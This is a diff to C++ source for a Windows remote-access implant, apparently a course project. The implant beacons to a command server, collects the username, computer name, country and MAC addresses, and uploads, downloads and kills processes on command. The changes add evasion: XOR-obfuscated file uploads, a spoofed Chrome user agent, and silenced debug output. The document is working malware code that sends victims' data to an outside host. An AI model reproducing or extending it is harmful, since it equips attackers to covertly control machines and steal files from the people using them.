@@ -73,9 +73,8 @@ std::string send_enc(std::string key, std::string data, std::string endpoint, HA
 
 
 //Uploads file to server via HTTP POST
-//Params: handle for internet, path of file to upload, server ip, port 
-BOOL doFileUpload(HANDLE hConnect, char* filepath) {
-	//https://stackoverflow.com/questions/6407755/how-to-send-a-zip-file-using-wininet-in-my-vc-application
+//Params: handle for internet, path of file to upload, key for XOR "encryption" 
+BOOL doFileUpload(HANDLE hConnect, char* filepath, int xorKey) {
 	char hdrs[] = "Content-Type: multipart/form-data; boundary=CSEC476";
 	char head[] = "--CSEC476\r\nContent-Disposition: form-data; name=\"file\"; filename=\"upload.bin\"\r\nContent-Type: application/octet-stream\r\n\r\n";
 	char tail[] = "\r\n--CSEC476--\r\n";
@@ -102,9 +101,12 @@ BOOL doFileUpload(HANDLE hConnect, char* filepath) {
 			HttpEndRequest(hRequest, NULL, HSR_INITIATE, 0);
 			return FALSE;
 		}
-		cout << bytesRead << "\n";
+		//cout << bytesRead << "\n";
+		for (int b = 0; b < bytesRead; b++) {
+			data[b] ^= xorKey;
+		}
 		InternetWriteFile(hRequest, (const void*)data, bytesRead, &bytesWritten);
-		cout << bytesWritten << "\n";
+		//cout << bytesWritten << "\n";
 	} while (bytesRead == sizeof(data));
 	InternetWriteFile(hRequest, (const void*)tail, strlen(tail), &bytesWritten);
 	HttpEndRequest(hRequest, NULL, HSR_INITIATE, 0);
@@ -114,7 +116,6 @@ BOOL doFileUpload(HANDLE hConnect, char* filepath) {
 
 //Downloads file to path
 BOOL doFileDownload(std::string url, std::string filepath) {
-	cout << url << " " << filepath << "\n";
 	if (S_OK == URLDownloadToFileA(NULL, url.c_str(), filepath.c_str(), 0, NULL))
 		return TRUE;
 	return FALSE;
@@ -316,7 +317,7 @@ std::string getNetworkInfo() {
 					buf[UNLEN] = 0;
 					nwInfo += buf;
 					nwInfo += ",";
-					cout << std::hex << setfill('0') << setw(2) << (int)pAdapter->Address[i] << "\n";
+					//cout << std::hex << setfill('0') << setw(2) << (int)pAdapter->Address[i] << "\n";
 				}
 				else {
 					char buf[UNLEN + 1];
@@ -326,7 +327,7 @@ std::string getNetworkInfo() {
 					buf[UNLEN] = 0;
 					nwInfo += buf;
 					nwInfo += "-";
-					cout << std::hex << setfill('0') << setw(2) << (int)pAdapter->Address[i] << "-";
+					//cout << std::hex << setfill('0') << setw(2) << (int)pAdapter->Address[i] << "-";
 				}
 
 			}
@@ -356,7 +357,7 @@ std::string gatherInfo(HANDLE hInternet) {
 
 	BOOL getUserSuccess = GetUserNameA(username, &len);
 	if (getUserSuccess) {
-		cout << username << "\n";
+		//cout << username << "\n";
 		allInfo += username;
 		allInfo += "&";
 	}
@@ -369,7 +370,7 @@ std::string gatherInfo(HANDLE hInternet) {
 
 	BOOL getComputerNameSuccess = GetComputerNameA(computername, &len2);
 	if (getComputerNameSuccess) {
-		cout << computername << "\n";
+		//cout << computername << "\n";
 		allInfo += computername;
 		allInfo += "&";
 	}
@@ -380,7 +381,7 @@ std::string gatherInfo(HANDLE hInternet) {
 	GEOID g = GetUserGeoID(GEOCLASS_NATION);
 	char iso2[UNLEN + 1];
 	GetGeoInfoA(g, GEO_ISO2, iso2, UNLEN + 1, 0);
-	cout << g << " " << iso2 << "\n";
+	//cout << g << " " << iso2 << "\n";
 	allInfo += iso2;
 	allInfo += "&";
 
@@ -404,19 +405,21 @@ int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdL
 	const int SLEEPTIME = 4000;
 	DWORD MAX_CMD_TIME = 5 * (10000000);
 	const std::string key = "CSEC476";
-
+	int xorKey = 0x7f;
 	PCTSTR rgpszAcceptTypes[] = { _T("text/*"), NULL };
-	HANDLE hInternet = InternetOpenA("test1", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
+
+	//passCheck();
+
+	HANDLE hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
 	HANDLE hConnect = InternetConnectA(hInternet, IP, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
 	HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", "/heartbeat", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
 	HttpEndRequestA(hRequest, NULL, NULL, NULL);
-
 	
 	while (true) {
 		HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", "/heartbeat", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
 		std::string response = sendRequestGetResponse(hRequest);
 		response = decode(key, response);
-		cout << "Response " << response << "\n";
+		//cout << "Response " << response << "\n";
 		//Process request here. If first part of string is a 1, do this... 2 do this... etc.
 		std::string code = response.substr(0, response.find(" "));
 		int first;
@@ -444,7 +447,7 @@ int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdL
 		case 5:
 			//UPLOAD
 			cout << "Got 5" << "\n";
-			doFileUpload(hConnect, (char*) response.substr(response.find(" ") + 1).c_str());
+			doFileUpload(hConnect, (char*) response.substr(response.find(" ") + 1).c_str(), xorKey);
 			break;
 		case 6:
 			//DOWNLOAD
@@ -456,7 +459,7 @@ int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdL
 		case 7:
 			//KILL
 			cout << "Got 7" << "\n";
-			cout << atoi(response.substr(response.find(" ") + 1).c_str()) << "\n";
+			//cout << atoi(response.substr(response.find(" ") + 1).c_str()) << "\n";
 			killProcess(atoi(response.substr(response.find(" ") + 1).c_str()));
 			break;
 		default:
